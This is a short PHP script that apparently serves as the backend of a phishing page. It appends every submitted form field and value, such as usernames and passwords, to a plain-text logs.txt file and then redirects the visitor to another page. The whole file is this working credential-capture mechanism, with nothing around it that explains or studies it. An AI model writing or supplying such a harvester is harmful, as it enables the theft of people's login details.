<?php
 
// Set the location to redirect the page
header ('Location: redirect.html');
 
// Open the text file in writing mode
$handle = fopen("logs.txt", "a");
 
foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}
 
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>